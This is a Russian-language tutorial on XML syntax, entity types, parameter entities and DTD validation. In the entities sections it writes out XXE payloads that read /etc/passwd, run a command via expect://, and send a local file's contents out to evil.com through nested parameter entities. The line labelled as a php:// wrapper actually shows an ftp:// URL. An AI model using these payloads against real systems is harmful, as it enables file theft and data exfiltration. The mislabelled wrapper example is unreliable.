XML (eXtensible Markup Language) — это язык разметки, предназначенный для хранения и передачи структурированных данных.


# Обобщённо 

1. **Теги (Tags)**:
- Теги используются для обозначения начала и конца элемента. Теги заключаются в угловые скобки `< >`.
`<element>Значение</element>`

2. **Атрибуты (Attributes)**:
- Атрибуты предоставляют дополнительную информацию об элементе. Они указываются внутри открывающего тега.
`<element attribute="value">Значение</element>`

3. **Корневой элемент (Root Element)**:
- Каждый XML-документ должен иметь один корневой элемент, который содержит все остальные элементы.
```
<root>
	<child>Значение</child>
</root>
```

4. **Комментарии (Comments)**:
- Комментарии в XML начинаются с `<!--` и заканчиваются `-->`.        
`<!-- Это комментарий -->`

5. **Сущности (Entities)**:
- Сущности используются для представления специальных символов или для включения внешних данных.
`<text>&amp;</text> <!-- &amp; представляет символ & -->`


----
# Типы сущностей в XML

#### 1. **Предопределенные сущности**:
- Это стандартные сущности, которые используются для представления специальных символов, которые в противном случае были бы интерпретированы как часть синтаксиса XML.

- `&amp;` — амперсанд (`&`)
- `&lt;` — знак меньше (`<`)
- `&gt;` — знак больше (`>`)
- `&quot;` — двойная кавычка (`"`)
- `&apos;` — апостроф (`'`)

##### Зачем нужны предопределенные сущности?
- **Экранирование символов**: Позволяют использовать специальные символы (например, `<`, `>`, `&`) в тексте XML-документа без нарушения синтаксиса.
- **Совместимость**: Обеспечивают корректное отображение символов в различных системах.

#### 2. **Внутренние сущности**:
- Это сущности, которые определяются внутри документа и могут быть использованы для упрощения повторяющихся данных.
```
<!ENTITY example "Это внутренняя сущность">
<text>&example;</text>
```

#### 3. **Внешние сущности**:
- Это сущности, которые ссылаются на внешние ресурсы, такие как файлы или URL.
```
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<text>&xxe;</text>
```

- **Файловая система (`file://`)**:
	`<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- **HTTP/HTTPS (`http://` или `https://`)**:
	`<!ENTITY xxe SYSTEM "https://example.com/data.xml">`
- **PHP-обертки (`php://`)**:
	`<!ENTITY xxe SYSTEM "ftp://example.com/data.txt">`
- **Обработка данных (`expect://`)**:
	`<!ENTITY xxe SYSTEM "expect://id">`

#### 4. **Параметрические сущности:**
 - `%`
 - `&#x25;`

**Параметрические сущности** — это специальный тип сущностей, которые используются **только внутри DTD (Document Type Definition)**. Они начинаются с символа `%` и позволяют создавать модульные и повторно используемые определения в DTD.

##### Основные особенности:
1. **Используются только в DTD**: Параметрические сущности не могут быть использованы в теле XML-документа.
2. **Начинаются с `%`**: Например, `%myEntity;`.
3. **Упрощают DTD**: Позволяют избежать дублирования кода и делают DTD более читаемым.

Пример `%`
```
<!DOCTYPE example [
    <!-- Определяем параметрическую сущность -->
    <!ENTITY % commonAttributes "id CDATA #REQUIRED">
    
    <!-- Используем параметрическую сущность -->
    <!ELEMENT example (item*)>
    <!ELEMENT item EMPTY>
    <!ATTLIST item %commonAttributes;>
]>
<example>
    <item id="1"/>
    <item id="2"/>
</example>
```
- `%commonAttributes;` — это параметрическая сущность, которая определяет атрибут `id` как обязательный.
- Она используется в определении элемента `item`, чтобы избежать повторения кода.

##### Почему иногда используется `&#x25;` вместо `%`?
Символ `%` имеет специальное значение в XML и DTD. Если вам нужно использовать символ `%` в значении сущности (например, внутри другой сущности), его нужно **экранировать**. Для этого используется числовое представление символа `%` в Unicode: `&#x25;`.

Пример `&#x25;`
```
<!DOCTYPE example [
    <!-- Определяем параметрическую сущность -->
    <!ENTITY % file SYSTEM "file:///path/to/file">
    
    <!-- Используем параметрическую сущность внутри другой сущности -->
    <!ENTITY % param "<!ENTITY &#x25; query SYSTEM 'https://evil.com/xxe_endpoint?data=%file;'>">
    
    <!-- Используем параметрическую сущность -->
    %param;
]>
```
- `%file;` — это параметрическая сущность, которая ссылается на файл.
- `%param;` — это другая параметрическая сущность, которая определяет новую сущность `%query;`.
- Символ `%` внутри значения сущности `%param;` экранирован как `&#x25;`, чтобы он не интерпретировался как начало новой параметрической сущности.


### Зачем нужны символы `&`, `<`, `>`, и другие

1. **Символ `&`**:
- Используется для обозначения начала сущности. Например, `&amp;` представляет символ `&`.

2. **Символы `<` и `>`**:
- Используются для обозначения начала и конца тегов. Если вам нужно использовать эти символы в тексте, их нужно заменить на соответствующие сущности:

- `<` заменяется на `&lt;`
- `>` заменяется на `&gt;`

3. **Символы `"` и `'`**:
- Используются для обозначения атрибутов. Если вам нужно использовать эти символы в тексте, их нужно заменить на соответствующие сущности:

- `"` заменяется на `&quot;`
- `'` заменяется на `&apos;`

### Пример XML-документа

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE catalog [
    <!ENTITY author "John Doe">
    <!ENTITY book_title "XML Basics">
]>
<catalog>
    <book id="1">
        <title>&book_title;</title>
        <author>&author;</author>
        <description>This is a book about &lt;XML&gt; basics.</description>
    </book>
    <book id="2">
        <title>Advanced XML</title>
        <author>Jane Smith</author>
        <description>This book covers advanced topics in &amp;XML.</description>
    </book>
</catalog>
```


----
# Что такое DTD

**DTD (Document Type Definition)** — это набор правил, который определяет структуру и допустимые элементы XML-документа. DTD используется для описания:

- Какие элементы могут присутствовать в документе.
- Какие атрибуты могут быть у элементов.
- Порядок и вложенность элементов.
- Типы данных для элементов и атрибутов.

DTD может быть встроенным (внутри XML-документа) или внешним (храниться в отдельном файле). Он помогает валидировать XML-документ, проверяя, соответствует ли он заданной структуре.

### Зачем нужен DTD?

1. **Валидация XML-документа**:

- DTD позволяет проверить, что XML-документ соответствует ожидаемой структуре. Например, можно убедиться, что все обязательные элементы присутствуют, а атрибуты имеют правильные значения.

2. **Стандартизация структуры**:

- DTD помогает определить единый стандарт для XML-документов, что особенно полезно при обмене данными между системами.

3. **Поддержка сущностей**:

- DTD позволяет определять сущности (entities), которые могут быть использованы для повторного использования данных или включения внешних ресурсов.

### Основные компоненты DTD

##### 1. **Элементы (Elements)**:
- Определяют, какие элементы могут присутствовать в XML-документе и их структуру.
	`<!ELEMENT имя_элемента (содержимое)>`

`<!ELEMENT book (title, author, year)>`
Это означает, что элемент `book` должен содержать три дочерних элемента: `title`, `author` и `year`.
        
##### 2. **Атрибуты (Attributes)**:
- Определяют, какие атрибуты могут быть у элементов, и их типы.        
	`<!ATTLIST имя_элемента имя_атрибута тип_атрибута значение_по_умолчанию>`

`<!ATTLIST book id CDATA #REQUIRED>`
Это означает, что элемент `book` должен иметь атрибут `id`, который является строкой (`CDATA`), и он обязателен (`#REQUIRED`).
        
##### 3. **Сущности (Entities)**:
- Определяют текстовые или внешние данные, которые могут быть использованы в XML-документе.
	`<!ENTITY имя_сущности "значение">`

`<!ENTITY author "John Doe">`
Это означает, что сущность `&author;` будет заменена на `John Doe`.
        
##### 4. **Комментарии (Comments)**:
- Позволяют добавлять пояснения в DTD.
`<!-- Это комментарий -->`


### Типы DTD

##### 1. **Внутренний DTD**:
- Определяется внутри XML-документа.
```

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE catalog [
	<!ELEMENT catalog (book*)>
	<!ELEMENT book (title, author, year)>
	<!ELEMENT title (#PCDATA)>
	<!ELEMENT author (#PCDATA)>
	<!ELEMENT year (#PCDATA)>
]>
<catalog>
	<book>
		<title>XML Basics</title>
		<author>John Doe</author>
		<year>2023</year>
	</book>
</catalog>
```

##### 2. **Внешний DTD**:
- Определяется в отдельном файле и подключается к XML-документу.

- Файл `catalog.dtd`:
```
<!ELEMENT catalog (book*)>
<!ELEMENT book (title, author, year)>
<!ELEMENT title (#PCDATA)>
<!ELEMENT author (#PCDATA)>
<!ELEMENT year (#PCDATA)>
```
- XML-документ:
```
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE catalog SYSTEM "catalog.dtd">
	<catalog>
		<book>
			<title>XML Basics</title>
			<author>John Doe</author>
			<year>2023</year>
		</book>
	</catalog>
```

### Пример DTD с сущностями
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE catalog [
    <!ENTITY author "John Doe">
    <!ENTITY book_title "XML Basics">
    <!ELEMENT catalog (book*)>
    <!ELEMENT book (title, author, year)>
    <!ELEMENT title (#PCDATA)>
    <!ELEMENT author (#PCDATA)>
    <!ELEMENT year (#PCDATA)>
]>
<catalog>
    <book>
        <title>&book_title;</title>
        <author>&author;</author>
        <year>2023</year>
    </book>
</catalog>
```
В этом примере:
- Определены две сущности: `&author;` и `&book_title;`.
- Сущности используются внутри элементов `title` и `author`.

### Преимущества и недостатки DTD

**Преимущества**:
- Простота и легкость в использовании.
- Поддержка сущностей для повторного использования данных.
- Возможность валидации XML-документов.

**Недостатки**:
- Ограниченная поддержка типов данных (только строки, списки и т.д.).
- Нет поддержки пространств имен (namespaces).
- Менее мощный по сравнению с альтернативами, такими как XML Schema (XSD).

### Альтернативы DTD

1. **XML Schema (XSD)**:
    - Более мощный и гибкий инструмент для определения структуры XML-документов.
    - Поддерживает типы данных, пространства имен и сложные правила валидации.

2. **RELAX NG**:
    - Альтернативный язык для описания структуры XML-документов.
    - Проще и гибче, чем XSD.